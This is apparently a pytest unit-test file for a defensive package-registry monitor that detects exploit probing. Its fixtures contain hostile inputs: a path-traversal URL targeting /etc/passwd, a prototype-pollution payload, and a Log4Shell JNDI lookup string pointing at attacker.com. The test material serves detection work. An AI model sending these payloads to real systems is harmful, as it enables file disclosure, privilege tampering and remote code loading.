"""Unit tests for PackageRegistryMonitor (Blackwall Pillar 6 Task 13)."""

from datetime import datetime, timedelta, timezone
import uuid
import pytest

from blackwall.enterprise.advanced_threat_detection import (
    EventSource,
    NormalizedEvent,
    RegistryThreatEvidence,
)
from blackwall.enterprise.advanced_threat_detection.registry import (
    PackageRegistryMonitor,
)
from blackwall.enterprise.advanced_threat_detection.store import AttackGraphStore


def create_registry_event(
    agent_id: str = "agent-pkg-01",
    action: str = "http_get",
    target: str = "https://registry.npmjs.org/express",
    offset_seconds: float = 0.0,
    risk_score: float = 0.4,
    source: EventSource = EventSource.PIPELINE_EXECUTION,
    metadata: dict = None,
    base_time: datetime = None,
) -> NormalizedEvent:
    """Helper to create a UTC-aware NormalizedEvent for package registry tests."""
    if base_time is None:
        base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)

    return NormalizedEvent(
        event_id=uuid.uuid4(),
        timestamp=base_time + timedelta(seconds=offset_seconds),
        source=source,
        agent_id=agent_id,
        action=action,
        target=target,
        metadata=metadata or {},
        risk_score=risk_score,
    )


@pytest.mark.asyncio
async def test_monitor_access():
    """Verify monitor_registry_access streams and normalizes events (Requirement 9.1)."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)

    async def sample_request_stream():
        yield {
            "action": "GET",
            "endpoint": "/lodash",
            "status_code": 200,
            "package_name": "lodash",
        }
        yield {
            "action": "GET",
            "endpoint": "/react",
            "status_code": 200,
            "package_name": "react",
        }

    collected = []
    async for event in monitor.monitor_registry_access(
        agent_id="build-agent-01",
        registry_url="https://registry.npmjs.org",
        request_stream=sample_request_stream(),
    ):
        collected.append(event)

    assert len(collected) == 2
    assert all(isinstance(ev, NormalizedEvent) for ev in collected)
    assert collected[0].agent_id == "build-agent-01"
    assert collected[0].target.startswith("https://registry.npmjs.org/")
    assert collected[0].metadata.get("registry_type") == "npm"



@pytest.mark.asyncio
async def test_exploit_probing_path_traversal():
    """Verify malformed package requests with path traversal are detected (Requirement 9.2, 9.4, 9.5)."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)

    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(minutes=10))

    event = create_registry_event(
        agent_id="attacker-01",
        action="GET",
        target="https://artifactory.internal/artifactory/libs-release/../../../../etc/passwd",
        offset_seconds=5.0,
        metadata={
            "registry_type": "Artifactory",
            "package_name": "../../../../etc/passwd",
            "url": "https://artifactory.internal/artifactory/libs-release/../../../../etc/passwd",
        },
        base_time=base_time,
    )
    await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(
        agent_id="attacker-01", time_window=time_window
    )
    assert len(evidences) >= 1
    evidence = evidences[0]
    assert isinstance(evidence, RegistryThreatEvidence)
    assert evidence.registry_type.lower() == "artifactory"
    assert any("traversal" in ind.lower() for ind in evidence.exploit_indicators)


@pytest.mark.asyncio
async def test_exploit_probing_prototype_pollution():
    """Verify prototype pollution requests in npm are detected (Requirement 9.2, 9.5)."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)

    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(minutes=10))

    event = create_registry_event(
        agent_id="attacker-02",
        action="POST",
        target="https://registry.npmjs.org/__proto__/pollute",
        offset_seconds=2.0,
        metadata={
            "registry_type": "npm",
            "package_name": "__proto__",
            "payload": '{"__proto__": {"admin": true}}',
        },
        base_time=base_time,
    )
    await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(
        agent_id="attacker-02", time_window=time_window
    )
    assert len(evidences) >= 1
    evidence = evidences[0]
    assert evidence.registry_type.lower() == "npm"
    assert any("prototype" in ind.lower() for ind in evidence.exploit_indicators)


@pytest.mark.asyncio
async def test_exploit_probing_unusual_404_scanning():
    """Verify rapid 404 scanning across multiple packages is detected as unusual pattern (Requirement 9.3)."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)

    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(minutes=5))

    for i in range(8):
        event = create_registry_event(
            agent_id="scanner-01",
            action="GET",
            target=f"https://pypi.org/pypi/fake-pkg-{i}/json",
            offset_seconds=float(i * 2),
            metadata={
                "registry_type": "PyPI",
                "package_name": f"fake-pkg-{i}",
                "status_code": 404,
            },
            base_time=base_time,
        )
        await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(
        agent_id="scanner-01", time_window=time_window
    )
    assert len(evidences) >= 1
    evidence = evidences[0]
    assert evidence.registry_type.lower() == "pypi"
    assert any("404" in ind.lower() or "scanning" in ind.lower() for ind in evidence.exploit_indicators)


@pytest.mark.asyncio
async def test_cve_correlation():
    """Verify detected patterns correlate against known CVE exploitation signatures (Requirement 9.6)."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)

    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(minutes=10))

    # Log4j / JNDI LDAP lookup in package metadata/user-agent
    event = create_registry_event(
        agent_id="attacker-cve",
        action="GET",
        target="https://artifactory.internal/artifactory/api/search/artifact",
        offset_seconds=5.0,
        metadata={
            "registry_type": "Artifactory",
            "package_name": "log4j-core",
            "query": "${jndi:ldap://attacker.com/exploit}",
        },
        base_time=base_time,
    )
    await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(
        agent_id="attacker-cve", time_window=time_window
    )
    assert len(evidences) >= 1
    evidence = evidences[0]
    assert len(evidence.cve_candidates) >= 1
    assert any("CVE-2021-44228" in cve for cve in evidence.cve_candidates)


@pytest.mark.asyncio
async def test_benign_traffic_not_flagged():
    """Verify standard package downloads are not flagged as threats."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)

    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(minutes=10))

    for pkg in ["requests", "numpy", "pandas"]:
        event = create_registry_event(
            agent_id="benign-agent",
            action="GET",
            target=f"https://pypi.org/simple/{pkg}/",
            offset_seconds=1.0,
            metadata={
                "registry_type": "PyPI",
                "package_name": pkg,
                "status_code": 200,
            },
            base_time=base_time,
        )
        await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(
        agent_id="benign-agent", time_window=time_window
    )
    assert len(evidences) == 0


@pytest.mark.asyncio
async def test_invalid_time_window_raises_error():
    """Verify end_time < start_time raises ValueError."""
    monitor = PackageRegistryMonitor()
    t1 = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    t0 = datetime(2026, 8, 13, 11, 0, 0, tzinfo=timezone.utc)
    with pytest.raises(ValueError):
        await monitor.detect_exploit_probing(time_window=(t1, t0))


@pytest.mark.asyncio
async def test_stream_resilience_on_malformed_records():
    """Verify malformed records do not terminate monitor_registry_access stream."""
    monitor = PackageRegistryMonitor()

    async def mixed_stream():
        # Valid record 1
        yield {"endpoint": "/express", "package_name": "express"}
        # Malformed record: invalid nonnumeric risk score
        yield {"endpoint": "/bad1", "risk_score": "not_a_number"}
        # Malformed record: naive datetime
        yield {"endpoint": "/bad2", "timestamp": datetime(2026, 8, 13, 12, 0, 0)}
        # Valid record 2
        yield {"endpoint": "/lodash", "package_name": "lodash"}

    events = []
    async for ev in monitor.monitor_registry_access(
        agent_id="resilience-agent",
        registry_url="https://registry.npmjs.org",
        request_stream=mixed_stream(),
    ):
        events.append(ev)

    assert len(events) == 3
    assert events[0].agent_id == "resilience-agent"
    assert events[0].metadata.get("package_name") == "express"
    assert events[2].metadata.get("package_name") == "lodash"



@pytest.mark.asyncio
async def test_exploit_probing_gradual_404_scanning():
    """Verify gradual 404 scanning spanning > 5 minutes with consecutive gaps <= 5 min is detected."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)

    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    # 6 events spaced 90 seconds apart = total span 450 seconds (> 300s), but consecutive gap 90s (<= 300s)
    for i in range(6):
        event = create_registry_event(
            agent_id="gradual-agent",
            action="GET",
            target=f"https://pypi.org/simple/pkg-gradual-{i}/",
            offset_seconds=float(i * 90),
            metadata={
                "registry_type": "PyPI",
                "package_name": f"pkg-gradual-{i}",
                "status_code": 404,
            },
            base_time=base_time,
        )
        await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(
        agent_id="gradual-agent",
        time_window=(base_time - timedelta(minutes=1), base_time + timedelta(minutes=20)),
    )

    assert len(evidences) >= 1
    assert evidences[0].registry_type == "PyPI"
    assert any("gradual-agent" in ind for ind in evidences[0].exploit_indicators)


